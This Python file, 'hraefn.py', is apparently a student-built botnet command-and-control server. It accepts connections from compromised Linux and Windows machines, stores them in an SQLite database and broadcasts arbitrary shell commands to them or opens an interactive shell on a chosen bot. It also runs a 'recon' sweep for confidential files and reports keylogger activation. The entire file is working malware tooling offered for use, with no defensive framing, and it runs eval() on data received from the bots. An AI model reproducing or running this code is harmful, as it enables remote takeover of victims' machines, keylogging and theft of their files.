#!/usr/bin/env python3

"""
AUTHORS: Jeffrey Lee, Toni Mason, Blake Bargen
START DATE: 10/11/2022
END DATE: 10/29/2022
MODULE NAME: hraefn.py
"""

from urllib import response


try:
	import socket # Import socket for creating TCP connection.
	from time import sleep # Import sleep from time to halt execution of program when necessary.
	import os # Import os for functions like _exit and system...
	from sys import exit # Import exit from sys to quit program when specified.
	from threading import Thread # Import Timer to create threads for our functions.
	from queue import Queue # Import Queue to use queue data structure functions.
	from subprocess import run # Import run for executing os.system commands.
	import sqlite3
except ImportError as err:
	print(f'Import error: {err}')
	sleep(5)
	exit(1)

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

#  CONSTANTS   #
PORT = 1337 # Port number to receive connections from.
IP = "192.168.56.103" # IP address of your computer. Change this!
TO_ACCEPT = 10 # Number of connections to accept.
NUM_OF_THREADS = 2 # Number of threads that we will create.
THREAD_IDS = [1, 2] # Thread identifiers.
BUFFER = 20000 # Maximum number of bytes to accept from the output of command.
COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
ENCODING = 'utf-8' # Encoding scheme.
DIRECTORY = './bots/' # Directory to store target response files in.
if not os.path.exists(DIRECTORY):
	os.mkdir(DIRECTORY) # Create the folder where our response files will be stored.
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#   GLOBALS   #
WINDOWS_CONNS = {} # Dict containing Windows machines IP addresses and corresponding socket object.
LINUX_CONNS = {} # Dict containing Linux machines IP addresses and corresponding socket object.
WINDOWS_COUNT = 0 # Count for the number of Windows machines connected to our botnet.
LINUX_COUNT = 0 # Count for the number of Linux machines connected to our botnet.
IP_ADDRESSES = [[],[]] # A list containing the IP addresses of both Lin/Win machines. Seperate lists.

# Database Object #
CONNECTIONSDB = sqlite3.connect("bots.db")
CONNECTIONSCUR = CONNECTIONSDB.cursor()

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#  ANSICOLORS  #
RESET = '\033[0m'
BOLD = '\033[01m'
BLUE = '\033[94m'
DARKBLUE = '\033[34m'
GREEN = '\033[92m'
RED = '\033[91m'
PURPLE = '\033[95m'
DARKPURPLE = '\033[35m'
ORANGE = '\033[33m'

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
'''
- pull from database list
- whenever a new connection is made add to the database
- database contains ip address and system (lin or win)

'''
class Server():
	"""Socket server"""
	def __init__(self):
		pass

	def create_socket(self):
		"""This function will create a single server socket will create a socket
		and bind it to an IP and network interface.
			Arguments:
				None
			Returns:
				None
		"""
		try:	
			self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server_socket.bind((IP, PORT))
			self.server_socket.listen(TO_ACCEPT)
		except:
			print(RED + '[-] There is a running Hraefn. Make sure you have the right IP address and try again.\n' + RESET)
			os._exit(1)

	def accept_connections(self):
		"""This function will accept all incoming connectins to this server. This function
		is also storing connections from Windows and Linux machines into there appropiate
		dictionaries. All IPs connected will also be dealt with here.
			Arguments:
				None
			Returns:
				None
		"""
		# To modify and altar global variables:
		global LINUX_CONNS
		global LINUX_COUNT
		global WINDOWS_CONNS
		global WINDOWS_COUNT
		global IP_ADDRESSES

		LINUX_CONNS.clear()
		WINDOWS_CONNS.clear()


		# SQL CODE #
		global CONNECTIONSDB
		global CONNECTIONSCUR
		CONNECTIONSDB = sqlite3.connect("bots.db")  # SQL CONNECTION

		CONNECTIONSCUR = CONNECTIONSDB.cursor()  # SQL CURSOR

		CONNECTIONSCUR = CONNECTIONSCUR.execute("SELECT ip_address, os FROM bots")  # SQL RESULT

		for row in CONNECTIONSCUR.execute("SELECT ip_address, os FROM bots"):	# loops through sql db
			if row[1] == "Windows":
				IP_ADDRESSES[1].append(row[0])	#stores windows ip addrs
			else:
				IP_ADDRESSES[0].append(row[0])	#stores linux ip addrs

		while True:
			conn, addr = self.server_socket.accept()
			conn.setblocking(1)
			initial_response = conn.recv(COMMMAND_SIZE).decode('utf-8')

			if initial_response == 'Linux':
				if addr[0] in LINUX_CONNS.keys():
					LINUX_CONNS[addr[0]] = conn
				else:
					LINUX_CONNS[addr[0]] = conn
					LINUX_COUNT += 1
					
					if addr[0] not in IP_ADDRESSES[0]:	# Checks to see if the linux ip is in bots.db
						IP_ADDRESSES[0].append(addr[0])
						new_bot = [str(addr[0]), 'Linux']
						CONNECTIONSCUR.execute("INSERT INTO bots VALUES(?, ?)", new_bot,)
						CONNECTIONSDB.commit()
			else:
				if addr[0] in WINDOWS_CONNS.keys():
					WINDOWS_CONNS[addr[0]] = conn
				else:
					WINDOWS_CONNS[addr[0]] = conn
					WINDOWS_COUNT += 1

					if addr[0] not in IP_ADDRESSES[1]:	# Checks to see if the Windows ip is in bots.db
						IP_ADDRESSES[1].append(addr[0])
						new_bot = [str(addr[0]), 'Windows']
						print(new_bot)
						CONNECTIONSCUR.execute("INSERT INTO bots VALUES(?, ?)", new_bot,)
						CONNECTIONSDB.commit()

	def close(self):
		"""This function will close all active connections.
				Arguments:
					None
				Returns:
					None
		"""

		for conn in LINUX_CONNS.values():
			conn.close()
		
		for conn in WINDOWS_CONNS.values():
			conn.close()
		

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class BotnetCmdCtrl:
	"""Botnet class definition"""
	def __init__(self):
		self.server = Server() # Will instantiate and store a Server object.
		self.server_queue = Queue() # Will be used to perform next job in the queue.
		self.threads = [] # Will store the two threads created.
		# To modify and altar global variables:
		global LINUX_COUNT
		global LINUX_CONNS
		global WINDOWS_COUNT
		global WINDOWS_COUNT
		global IP_ADDRESSES

	def handle_threads(self):
		"""This function will create two seperate threads.
		One will be used to accept incoming connections, and
		the other will be used to performing I/O between all
		of our connections.
			Arguments:
				None
			Returns:
				None
		"""
		for _ in range(NUM_OF_THREADS):
			t = Thread(target=self.command_and_control, daemon=True) # Create thread
			self.threads.append(t)
			t.start() # Start the thread

		
	def create_jobs(self):
		"""This function will create jobs and store them in a queue.
		The jobs will be executed by seperate threads.
			Arguments:
				None
			Returns:
				None
		"""
		for x in THREAD_IDS:
			self.server_queue.put(x) # Add element to the queue.
		self.server_queue.join() # Block main thread until worker threads have processes everything in queue.

	def get_command(self):
		"""This function gets a command from the user.
			Arguments:
				None
			Returns:
				The command that was provided by the user.
		"""
		current_dir = os.getcwd()
		cmd = input(GREEN + BOLD + f'{current_dir[1:]}$ ' + RESET)
		while True:
			if cmd == 'exit':
				print(RED, '\n[+] You have closed all connections. Exiting program.', RESET)
				self.server.close()
				os._exit(0)

			elif cmd[:3] == 'lin':
				resp_list = self.send_cmd_all_linux(cmd[4:])
				i = 0
				if cmd[4:] == 'recon':
					for output in resp_list:
						if i % 2 == 1:
							findings = eval(output)
							for k,v in findings.items():
								print(PURPLE + "File: " + v[0] + RESET)
								print(k)
								print('----------------------------' + '\n')
								x = 0
								for vals in v[1]:
									print(str(vals))
									if x % 2 == 1:
										print()
									x += 1
						else:
							print(GREEN + output + RESET + '\n')
						i +=1
				
				else:
					for output in resp_list:
						if i % 2 == 1:
							print(output)
						else:
							print((RED + output + RESET + '\n').replace(' ', ''))
						i += 1

			elif cmd[:3] == 'win':
				resp_list = self.send_cmd_all_windows(cmd[4:])
				i = 0
				if cmd[4:] == 'recon':
					print()
					for output in resp_list:
						if i % 2 == 1:
							findings = eval(output)
							for k,v in findings.items():
								print(PURPLE + "File: " + v[0] + RESET)
								print(k)
								print('----------------------------' + '\n')
								x = 0
								for vals in v[1]:
									print(str(vals))
									if x % 2 == 1:
										print()
									x += 1
						else:
							print(GREEN + output + RESET + '\n')
						i +=1
				else:
					for output in resp_list:
						if i % 2 == 1:
							print(output)
						else:
							print((RED + output + RESET + '\n').replace(' ', ''))
						i += 1

			elif cmd[:7] == 'sel lin': # Select the Linux target to connect to.
				try:
					index = int(cmd[8:].strip())
					self.send_cmd_linux_target(index)
				except ValueError:
					print(RED + '[-] Invalid index.' + RESET)
					continue

			elif cmd[:7] == 'sel win': # Select the Windows target to connect to.
				try:
					index = int(cmd[8:].strip())
					self.send_cmd_windows_target(index)
				except ValueError:
					print(RED + '[-] Invalid index.' + RESET)
					continue


			elif cmd.strip() == 'ls bots': # Prints which machines are online and which are offline
				try:
					if len(IP_ADDRESSES[0]) == 0:
						print()
						print(RED + BOLD + '[!] Warning: ' + RESET + 'There are no Linux connections to list.\n')
					else:
						print(DARKPURPLE + BOLD + 'Linux connections:\n' + RESET)
						for ip in IP_ADDRESSES[0]:
							if ip in LINUX_CONNS.keys():
								if('raddr' in str(LINUX_CONNS[ip])):
									print(BLUE + str(IP_ADDRESSES[0].index(ip)) + RESET + ' - ' + str(ip) + GREEN + ' is online.' + RESET)
								else:
									print(BLUE + str(IP_ADDRESSES[0].index(ip)) + RESET + ' - ' + str(ip) + RED + ' is offline.' + RESET)
							else:
								print(BLUE + str(IP_ADDRESSES[0].index(ip)) + RESET + ' - ' + str(ip) + RED + ' is offline.' + RESET)
						print()
					if len(IP_ADDRESSES[1]) == 0:
						print(RED + BOLD + '[!] Warning: ' + RESET + 'There are no Windows connections to list.')
					else:
						print(DARKPURPLE + BOLD + 'Windows connections:\n' + RESET)
						for ip in IP_ADDRESSES[1]:
							if ip in WINDOWS_CONNS.keys():
								if('raddr' in str(WINDOWS_CONNS[ip])):
									print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + str(ip) + GREEN + ' is online.' + RESET)
								else:
									print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + str(ip) + RED + ' is offline.' + RESET)
							else:
								print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + str(ip) + RED + ' is offline.' + RESET)
						print()
				except ValueError:
					print(RED + '[-] Invalid index.' + RESET)
					continue

			elif cmd.strip() == 'close': # If command eq 'close',
				self.server.close()	# close all connections.
				print(ORANGE + BOLD + '[+]' + RESET + ' All connections were closed.')

			elif cmd.strip() == 'clear':
				os.system('clear')

			elif cmd.strip() == 'help':
				self.help()

			else:
				print(RED + BOLD + '[-] Invalid command!' + RESET + ' type' + GREEN + " 'help' " + RESET + 'for help menu.')
			
			current_dir = os.getcwd() # Update the current dir variable if user changes directory

			cmd = input(GREEN + BOLD + f'{current_dir[1:]}$ ' + RESET)
	
	def send_cmd_all_linux(self, cmd: str):
		"""This function will send the command to all linux bots in the botnet.
			Arguments:
				cmd (str): Command to send to target/s.
			Returns:
				Will return the response generated by the executed command on the client machines operating on linux.
		"""
		response_list = []
		if cmd == 'recon':
			for ip, conn in LINUX_CONNS.items():
				if('raddr' in str(conn)):
					conn.send(cmd.encode(ENCODING))
					response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
					response_list.extend([ip, response])
			return response_list
		else:
			for ip, conn in LINUX_CONNS.items():
				if('raddr' in str(conn)):
					conn.send(cmd.encode(ENCODING))
					response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
					response = response[2:-1]
					response = response.replace('\\n', '\n')
					response_list.extend([ip, response])
			return response_list
			
	def send_cmd_all_windows(self, cmd: str):
		"""This function sends a command to all windows bots in the botnet.
			Arguments:
				cmd (str): Command to send to target/s.
		 	Returns:
				None
		"""
		response_list = []

		if cmd == 'recon':
			for ip, conn in WINDOWS_CONNS.items():
				if('raddr' in str(conn)):
					conn.send(cmd.encode(ENCODING))
					response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
					response_list.extend([ip, response])
			return response_list

		for ip, conn in WINDOWS_CONNS.items():
			if('raddr' in str(conn)):
				conn.send(cmd.encode(ENCODING))
				response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
				response = response[2:-1]
				response = response.replace('\\n', '\n')
				response = response.replace('\\r', '')
				response_list.extend([ip, response])
		return response_list
	
	def send_cmd_linux_target(self, ip_index: int):
		"""This function will send a command to a specific Linux machine.
			Arguments:
				ip_index (int): The index of the IP address the user wants to connect to.
			Returns:
				None
		"""
		try:
			target_ip = IP_ADDRESSES[0][ip_index]
		except IndexError:
			print(RED + BOLD + '[!] Warning:' + RESET + ' There are no Linux connections.')
			return
		except:
			print(RED + '[-] An error was thrown...' + RESET)
			return
		try:
			conn = LINUX_CONNS[target_ip]
		except KeyError:
			print(RED + '[-] Invalid index!' + RED)

		while True:
			cmd = input(PURPLE + f'[shell][{target_ip}]$ ' + RESET)
			if cmd == 'back':
				break
			elif cmd == 'exit':
				print(RED + '\n[+] You have closed all connections. Exiting program.' + RESET)
				self.server.close()
				os._exit(1)
			elif cmd == 'help':
				self.help()
				continue
			elif cmd == 'clear':
				os.system('clear')
				continue

			try:
				conn.send(cmd.encode(ENCODING))
				resp = conn.recv(BUFFER).decode(ENCODING)
			except BrokenPipeError:
				print(RED + f'[-] The connection to {target_ip} is no longer available.' + RESET)
				del LINUX_CONNS[target_ip]
				break
			
			if resp == '[-] Invalid command.' or resp == 'Ok':
				print(RED + resp + RESET)
			elif resp == 'listening':
				print(BLUE + '[*] Keylogger initiated.' + RESET)
			else:
				resp = resp[2:-1]
				resp = resp.replace('\\n', '\n')
				print(resp)


	def send_cmd_windows_target(self, ip_index: int):
		"""This function will send a command to a specific Windows machine.
			Arguments:
				ip_index (int): The index of the IP address the user wants to connect to.
			Returns:
				None
		"""
		try:
			target_ip = IP_ADDRESSES[1][ip_index]
		except IndexError:
			print(RED + BOLD + '[!] Warning:' + RESET + ' There are no Windows connections.')
			return
		except:
			print(RED + '[-] An error was thrown.' + RESET)
			return

		try:
			conn = WINDOWS_CONNS[target_ip]
		except KeyError:
			print(RED + '[-] Invalid index!' + RED)

		while True:
			cmd = input(PURPLE + f'[shell][{target_ip}]$ ' + RESET)
			if cmd == 'back':
				break
			elif cmd == 'exit':
				print(RED + '\n[+] You have closed all connections. Exiting program.' + RESET)
				self.server.close()
				os._exit(1)
			elif cmd == 'help':
				self.help()
				continue
			elif cmd == 'clear':
				os.system('clear')
				continue

			try:
				conn.send(cmd.encode(ENCODING))
				resp = conn.recv(BUFFER).decode(ENCODING)
			except BrokenPipeError:
				print(RED + f'[-] The connection to {target_ip} is no longer available.' + RESET)
				del WINDOWS_CONNS[target_ip]
				break

			if resp == '[-] Invalid command.' or resp == 'Ok':
				print(RED + resp + RESET)
			else:
				resp = resp[2:-1]
				resp = resp.replace('\\n', '\n')
				resp = resp.replace('\\r', '')
				print(resp)

	def write_response_output(self, response: str, ip_addr: str):
		"""This function will write the response generated by each machine in the botnet 
		to a folder called "bots". The bots folder will contain files called by
		the IP addresses of each compromised machines.
		 	Arguments:
				response (str): The executed command response.
				ip_addr (str): The IP addresses of the current machine we are communicating with.
			Returns:
				None
		"""
		with open(DIRECTORY + ip_addr, 'a+') as botfile:
			botfile.write(response)
			
	def command_and_control(self):
		"""This function is running the operations for each (2) thread we create
		in the handle_threads function.
			Arguments:
				None
			Returns:
				None
		"""
		while True:
			x = self.server_queue.get()
			if x == 1:
				self.server.create_socket()
				self.server.accept_connections()
			if x == 2:
				self.get_command()
			self.server_queue.task_done()
				
	def help(self):
		"""This function will print the help menu.
			Arguments:
				None
			Returns:
				None
		"""
		print(PURPLE + BOLD + 'Commands in main session: ' + RESET)
		print(ORANGE + BOLD + '  ls bots >', RESET, 'List all devices and show online/offline status')
		print(ORANGE + BOLD + '  lin [command] >', RESET, 'Send command to all Linux machines.')
		print(ORANGE + BOLD + '  win [command] >', RESET, 'Send command to all Windows machines.')
		print(ORANGE + BOLD + '  lin|win recon >', RESET, 'Run confidentiality check on all Linux or all Windows machines')
		print(ORANGE + BOLD + '  sel lin|win [IP index] >', RESET, 'Select number from ls lin|win outputs and connect to one target.')
		print(ORANGE + BOLD + '  back >', RESET, 'Return to the main session.')
		print(ORANGE + BOLD + '  close >', RESET , 'Will close all active connections.')
		print(ORANGE + BOLD + '  exit >', RESET, "Quit the program.", end='\n\n')

	def start(self):
		"""This function will initiate the program.
			Arguments:
				None
			Returns:
				None
		"""
		self.handle_threads() # Call functions to create threads
		self.create_jobs() # Call function to create jobs.

	def program_info(self):
		print(DARKPURPLE + BOLD + """
   ▄█    █▄       ▄████████    ▄████████    ▄████████    ▄████████ ███▄▄▄▄   
  ███    ███     ███    ███   ███    ███   ███    ███   ███    ███ ███▀▀▀██▄ 
  ███    ███     ███    ███   ███    ███   ███    █▀    ███    █▀  ███   ███ 
 ▄███▄▄▄▄███▄▄  ▄███▄▄▄▄██▀   ███    ███  ▄███▄▄▄      ▄███▄▄▄     ███   ███ 
▀▀███▀▀▀▀███▀  ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███▀▀▀     ▀▀███▀▀▀     ███   ███ 
  ███    ███   ▀███████████   ███    ███   ███    █▄    ███        ███   ███ 
  ███    ███     ███    ███   ███    ███   ███    ███   ███        ███   ███ 
  ███    █▀      ███    ███   ███    █▀    ██████████   ███         ▀█   █▀  
                 ███    ███                                                  
""" + RESET)
		print('By: ' + PURPLE + BOLD + '@' + RESET + ORANGE + 'Jeffrey Lee' + RESET, end=' ')
		print('<|[*]|> ' + PURPLE + BOLD + '@' + RESET + ORANGE + 'Toni Mason' + RESET, end=' ')
		print( ' <|[*]|> ' + PURPLE + BOLD + '@' + RESET + ORANGE + 'Blake Bargen' + RESET, end='\n\n')

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """


def main():
	
	botnetObj = BotnetCmdCtrl() # Instantiating socket object.
	botnetObj.program_info() # Prints the program name.
	botnetObj.start() # Initiate the program.


if __name__ == '__main__':
	server = Server() # Will be used here to close all socket connections before exiting program.
	try:
		main()
	except KeyboardInterrupt: # Handling KeyboardInterrupt error.
		print(RED, '\nExiting program...', RESET)
		server.close()
		sleep(0.25)
		run(['reset'])
